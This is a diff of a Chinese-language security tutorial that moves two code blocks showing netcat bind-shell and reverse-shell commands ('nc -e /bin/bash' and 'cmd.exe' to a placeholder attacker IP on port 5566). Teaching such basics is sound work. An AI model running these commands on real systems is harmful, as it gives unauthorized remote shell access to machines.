@@ -173,10 +173,6 @@
 ![](img/13474747609a13c6db2a7c6d9860033b_123.png)
 
 **正向连接示例（目标监听，攻击者连接）：**
-```bash
-# 在目标机器上执行：监听端口，将shell绑定到该端口
-nc -lvp 5566 -e /bin/bash   # Linux
-nc -lvp 5566 -e cmd.exe     # Windows
 
 ![](img/13474747609a13c6db2a7c6d9860033b_125.png)
 
@@ -192,6 +188,10 @@ nc -lvp 5566 -e cmd.exe     # Windows
 
 ![](img/13474747609a13c6db2a7c6d9860033b_137.png)
 
+```bash
+# 在目标机器上执行：监听端口，将shell绑定到该端口
+nc -lvp 5566 -e /bin/bash   # Linux
+nc -lvp 5566 -e cmd.exe     # Windows
 # 在攻击者机器上执行：连接目标的IP和端口
 nc <目标IP> 5566
 ```
@@ -211,9 +211,6 @@ nc <目标IP> 5566
 ![](img/13474747609a13c6db2a7c6d9860033b_151.png)
 
 **反向连接示例（攻击者监听，目标连接）：**
-```bash
-# 在攻击者机器上执行：监听端口，等待连接
-nc -lvp 5566
 
 ![](img/13474747609a13c6db2a7c6d9860033b_153.png)
 
@@ -239,6 +236,9 @@ nc -lvp 5566
 
 ![](img/13474747609a13c6db2a7c6d9860033b_174.png)
 
+```bash
+# 在攻击者机器上执行：监听端口，等待连接
+nc -lvp 5566
 # 在目标机器上执行：主动连接攻击者的IP和端口，并送出shell
 nc <攻击者IP> 5566 -e /bin/bash   # Linux
 nc <攻击者IP> 5566 -e cmd.exe     # Windows
